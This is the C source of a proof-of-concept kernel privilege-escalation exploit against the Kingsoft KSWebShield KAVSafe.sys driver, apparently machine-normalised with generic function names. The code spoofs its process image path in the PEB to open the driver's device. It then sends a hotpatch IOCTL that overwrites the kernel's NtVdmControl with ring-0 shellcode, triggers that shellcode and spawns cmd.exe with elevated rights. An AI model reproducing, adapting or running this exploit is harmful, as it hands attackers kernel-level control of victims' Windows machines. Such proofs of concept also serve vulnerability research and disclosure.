#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_14__   TYPE_6__ ;
typedef  struct TYPE_13__   TYPE_5__ ;
typedef  struct TYPE_12__   TYPE_4__ ;
typedef  struct TYPE_11__   TYPE_3__ ;
typedef  struct TYPE_10__   TYPE_2__ ;
typedef  struct TYPE_9__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  sysmod ;
typedef  int /*<<< orphan*/  pbi ;
struct TYPE_12__ {TYPE_3__* Module; } ;
typedef  TYPE_4__ X_SYSTEM_MODULE_INFORMATION ;
typedef  char WCHAR ;
typedef  int USHORT ;
typedef  int ULONG ;
struct TYPE_14__ {TYPE_2__* ProcessParameters; } ;
struct TYPE_13__ {scalar_t__ PebBaseAddress; } ;
struct TYPE_11__ {int /*<<< orphan*/  ImageName; } ;
struct TYPE_9__ {int Length; char* Buffer; } ;
struct TYPE_10__ {TYPE_1__ ImagePathName; } ;
typedef  scalar_t__ PVOID ;
typedef  TYPE_5__ PROCESS_BASIC_INFORMATION ;
typedef  TYPE_6__* PPEB ;
typedef  int /*<<< orphan*/  (* PNT_VDM_CONTROL ) (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ;
typedef  int /*<<< orphan*/  (* PNT_QUERY_SYSTEM_INFORMATION ) (int,TYPE_4__*,int,int /*<<< orphan*/ *) ;
typedef  int /*<<< orphan*/  (* PNT_QUERY_INFORMATION_PROCESS ) (int /*<<< orphan*/ ,int /*<<< orphan*/ ,TYPE_5__*,int,int /*<<< orphan*/ *) ;
typedef  int /*<<< orphan*/  ModuleName ;
typedef  int /*<<< orphan*/  LPBYTE ;
typedef  scalar_t__ HMODULE ;
typedef  int /*<<< orphan*/  HKEY ;
typedef  scalar_t__ HANDLE ;
typedef  int DWORD ;
typedef  char CHAR ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC1 (scalar_t__,scalar_t__,int) ; 
 scalar_t__ FUNC2 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (scalar_t__,int /*<<< orphan*/ ,scalar_t__,int,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int*,int /*<<< orphan*/ ) ; 
 scalar_t__ ERROR_SUCCESS ; 
 int /*<<< orphan*/  FILE_READ_ATTRIBUTES ; 
 int /*<<< orphan*/  FILE_SHARE_READ ; 
 int FUNC4 () ; 
 scalar_t__ FUNC5 (char*) ; 
 scalar_t__ FUNC6 (scalar_t__,char*) ; 
 int /*<<< orphan*/  HKEY_LOCAL_MACHINE ; 
 scalar_t__ INVALID_HANDLE_VALUE ; 
 int /*<<< orphan*/  IOCTL_HOTPATCH_KERNEL_MODULE ; 
 scalar_t__ FUNC7 (scalar_t__) ; 
 int MAX_PATH ; 
 scalar_t__ NopNop ; 
 int /*<<< orphan*/  FUNC8 () ; 
 int /*<<< orphan*/  OPEN_EXISTING ; 
 scalar_t__ R0ShellCodeXP ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC10 (int /*<<< orphan*/ ,char*,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC11 (int /*<<< orphan*/ ,char*,int /*<<< orphan*/ *,int*,int /*<<< orphan*/ ,int*) ; 
 int /*<<< orphan*/  FUNC12 (scalar_t__,char*,int) ; 
 int /*<<< orphan*/  SW_SHOW ; 
 int /*<<< orphan*/  FUNC13 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 () ; 
 scalar_t__ FUNC15 (int) ; 
 int /*<<< orphan*/  FUNC16 (char*,...) ; 
 scalar_t__ FUNC17 (int /*<<< orphan*/ ,char) ; 
 int /*<<< orphan*/  FUNC18 (char*,char*) ; 
 int FUNC19 (char*) ; 

int FUNC20(int argc, char* argv[])
{

FUNC16("KSWebShield KAVSafe.sys <= 2010,04,14,609\n"
"Kernel Mode Privilege Escalation Vulnerability Proof-of-Concept\n"
"2010-5-23\n"
"By Lincoin \n\nPress Enter");
HKEY hkey ; 
WCHAR InstallPath[MAX_PATH];
DWORD datatype ; 
DWORD datasize = MAX_PATH * sizeof(WCHAR);
ULONG oldlen ;
PVOID pOldBufferData = NULL ; 

if (FUNC10(HKEY_LOCAL_MACHINE , "SOFTWARE\\Kingsoft\\KSWSVC", &hkey) == ERROR_SUCCESS)
{
if (FUNC11(hkey , L"ProgramPath" , NULL , &datatype , (LPBYTE)InstallPath , &datasize) != ERROR_SUCCESS)
{
FUNC9(hkey);
FUNC16("KSWebShield not installed\n");
FUNC14();
return 0 ;
}

FUNC9(hkey);
}
else
{
FUNC16("KSWebShield not installed\n");
FUNC14();
return 0 ;
}
FUNC18(InstallPath , L"\\kavinst.exe");


PROCESS_BASIC_INFORMATION pbi ; 

PNT_QUERY_INFORMATION_PROCESS pNtQueryInformationProcess ;
pNtQueryInformationProcess = (PNT_QUERY_INFORMATION_PROCESS)FUNC6(FUNC5("ntdll.dll" ) , "NtQueryInformationProcess");
pNtQueryInformationProcess(FUNC8() , 0 , &pbi , sizeof(pbi) , NULL);

PPEB peb ; 

peb = (PPEB)pbi.PebBaseAddress;
oldlen = peb->ProcessParameters->ImagePathName.Length;
peb->ProcessParameters->ImagePathName.Length = FUNC19(InstallPath) * sizeof(WCHAR);
pOldBufferData = FUNC15(peb->ProcessParameters->ImagePathName.Length);
FUNC12(pOldBufferData,peb->ProcessParameters->ImagePathName.Buffer , peb->ProcessParameters->ImagePathName.Length);
FUNC12(peb->ProcessParameters->ImagePathName.Buffer , InstallPath ,peb->ProcessParameters->ImagePathName.Length );
HANDLE hdev = FUNC2("\\\\.\\KAVSafe" , 
FILE_READ_ATTRIBUTES , 
FILE_SHARE_READ , 
0,
OPEN_EXISTING , 
0,
0);

if (hdev==INVALID_HANDLE_VALUE)
{
FUNC16("cannot open device %u\n", FUNC4());
FUNC14();
return 0 ; 
}
FUNC12(peb->ProcessParameters->ImagePathName.Buffer , pOldBufferData,peb->ProcessParameters->ImagePathName.Length);
peb->ProcessParameters->ImagePathName.Length = (USHORT)oldlen ; 

PNT_QUERY_SYSTEM_INFORMATION pNtQuerySystemInformation  ;
pNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)FUNC6(FUNC5("ntdll.dll") , "NtQuerySystemInformation");
X_SYSTEM_MODULE_INFORMATION sysmod ; 
HMODULE KernelHandle ; 

pNtQuerySystemInformation(0xb, &sysmod, sizeof(sysmod), NULL);
    KernelHandle = FUNC7(FUNC17(sysmod.Module[0].ImageName, '\\') + 1);
if (KernelHandle == 0 )
{
FUNC16("cannot load ntoskrnl!\n");
FUNC14();
return 0 ; 
}
PVOID pNtVdmControl = FUNC6(KernelHandle , "NtVdmControl");

if (pNtVdmControl == 0 )
{
FUNC16("cannot find NtVdmControl!\n");
FUNC14();
return 0 ; 
}
pNtVdmControl = (PVOID)((ULONG)pNtVdmControl - (ULONG)KernelHandle  );

FUNC16("NtVdmControl = %08x" , pNtVdmControl );
FUNC14();
ULONG ShellCodeSize = (ULONG)NopNop - (ULONG)R0ShellCodeXP;
ULONG pShellCode = (ULONG)R0ShellCodeXP; 


PVOID Data = FUNC15(0x48 + ShellCodeSize);

FUNC1((PVOID)((ULONG)Data + 0x48) , R0ShellCodeXP , ShellCodeSize);
CHAR ModuleName[68]= "ntoskrnl.exe" ; 
FUNC12( Data , ModuleName , sizeof(ModuleName));
*(ULONG*)((ULONG)Data + 64) = (ULONG)pNtVdmControl;
*(ULONG*)((ULONG)Data + 68) = ShellCodeSize ;
ULONG btr ; 
if (!FUNC3(hdev ,
IOCTL_HOTPATCH_KERNEL_MODULE , 
Data , 
0x48 + ShellCodeSize , 
NULL , 
0,
&btr , 0 
))
{
FUNC16("cannot device io control!%u\n" , FUNC4());
FUNC14();
return 0;
}

FUNC0(hdev);

PNT_VDM_CONTROL pR3NtVdmControl = (PNT_VDM_CONTROL)FUNC6(FUNC5("ntdll.dll") , "NtVdmControl");
pR3NtVdmControl(0,0);
FUNC13("cmd.exe" , SW_SHOW);
FUNC16("OK!\n ");

FUNC14();

return 0; 
}